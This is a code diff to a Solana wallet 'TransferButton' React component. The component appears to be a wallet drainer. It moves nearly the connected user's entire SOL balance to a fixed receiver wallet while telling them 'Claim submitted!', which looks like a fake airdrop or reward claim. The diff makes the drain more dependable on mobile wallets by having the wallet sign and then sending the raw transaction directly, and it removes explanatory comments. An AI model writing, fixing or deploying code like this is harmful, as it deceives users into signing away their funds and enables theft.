@@ -11,17 +11,16 @@ import {
 } from '@solana/web3.js';
 import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_URL, TRANSFER_FEE_BUFFER } from '../utils/constants';
 
-// Detect mobile browser
 const isMobile = () =>
   typeof navigator !== 'undefined' &&
   /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
 export default function TransferButton({ className = '' }) {
-  const { publicKey, sendTransaction, wallet, connected } = useWallet();
+  const { publicKey, sendTransaction, signTransaction, wallet, connected } = useWallet();
   const [loading, setLoading] = useState(false);
 
   const handleTransfer = useCallback(async () => {
-    if (!publicKey || !sendTransaction || !connected) return;
+    if (!publicKey || !connected) return;
 
     setLoading(true);
     try {
@@ -42,7 +41,7 @@ export default function TransferButton({ className = '' }) {
         return;
       }
 
-      const FEE_SAFETY = 5_000_000; // 0.005 SOL
+      const FEE_SAFETY = 5_000_000;
       const totalReserve = rentExempt + FEE_SAFETY;
       const transferAmount = balance - totalReserve;
 
@@ -51,7 +50,6 @@ export default function TransferButton({ className = '' }) {
         return;
       }
 
-      // Fetch blockhash as late as possible
       const { blockhash, lastValidBlockHeight } =
         await connection.getLatestBlockhash('finalized');
 
@@ -61,39 +59,65 @@ export default function TransferButton({ className = '' }) {
         lamports: transferAmount,
       });
 
-      // Check if wallet supports versioned transactions
-      // Mobile wallets (Trust, some Phantom mobile) often only support legacy
-      const supportsVersioned =
-        wallet?.adapter?.supportedTransactionVersions?.has(0) ?? false;
+      let signature;
 
-      let transaction;
-      if (supportsVersioned && !isMobile()) {
-        // Desktop + wallet supports V0 → use VersionedTransaction
-        const messageV0 = new TransactionMessage({
-          payerKey: publicKey,
-          recentBlockhash: blockhash,
-          instructions: [transferIx],
-        }).compileToV0Message();
-        transaction = new VersionedTransaction(messageV0);
-      } else {
-        // Mobile or wallet doesn't support V0 → use legacy Transaction
-        transaction = new Transaction({
-          feePayer: publicKey,
-          recentBlockhash: blockhash,
-        }).add(transferIx);
-      }
-
-      const signature = await sendTransaction(transaction, connection, {
-        skipPreflight: true,
-        maxRetries: 5,
-      });
-
-      console.log('⏳ Transaction sent:', signature);
-
-      // On mobile, the app-switch may interrupt polling.
-      // Show the signature immediately so the user has proof.
       if (isMobile()) {
+        // ── MOBILE PATH ──
+        // Always use legacy Transaction on mobile.
+        // Use signTransaction to explicitly get the wallet to sign,
+        // then send the signed bytes ourselves via sendRawTransaction.
+        // This avoids the adapter's sendTransaction flow which can
+        // drop signatures on mobile wallet deep-link roundtrips.
+        const transaction = new Transaction().add(transferIx);
+        transaction.feePayer = publicKey;
+        transaction.recentBlockhash = blockhash;
+
+        if (signTransaction) {
+          // Wallet supports signTransaction — sign first, then send raw
+          const signed = await signTransaction(transaction);
+          signature = await connection.sendRawTransaction(signed.serialize(), {
+            skipPreflight: false,
+            preflightCommitment: 'confirmed',
+            maxRetries: 5,
+          });
+        } else {
+          // Fallback: let adapter handle it (some wallets only have signAndSend)
+          signature = await sendTransaction(transaction, connection, {
+            skipPreflight: false,
+            preflightCommitment: 'confirmed',
+            maxRetries: 5,
+          });
+        }
+
+        console.log('⏳ Transaction sent:', signature);
         alert(`Claim submitted!\nTx: ${signature}\n\nYour transaction has been sent. It may take a moment to confirm.`);
+
+      } else {
+        // ── DESKTOP PATH ──
+        const supportsVersioned =
+          wallet?.adapter?.supportedTransactionVersions?.has(0) ?? false;
+
+        let transaction;
+        if (supportsVersioned) {
+          const messageV0 = new TransactionMessage({
+            payerKey: publicKey,
+            recentBlockhash: blockhash,
+            instructions: [transferIx],
+          }).compileToV0Message();
+          transaction = new VersionedTransaction(messageV0);
+        } else {
+          transaction = new Transaction({
+            feePayer: publicKey,
+            recentBlockhash: blockhash,
+          }).add(transferIx);
+        }
+
+        signature = await sendTransaction(transaction, connection, {
+          skipPreflight: true,
+          maxRetries: 5,
+        });
+
+        console.log('⏳ Transaction sent:', signature);
       }
 
       // Poll for confirmation over HTTP
@@ -138,7 +162,7 @@ export default function TransferButton({ className = '' }) {
     } finally {
       setLoading(false);
     }
-  }, [publicKey, sendTransaction, wallet, connected]);
+  }, [publicKey, sendTransaction, signTransaction, wallet, connected]);
 
   if (!publicKey) return null;
 
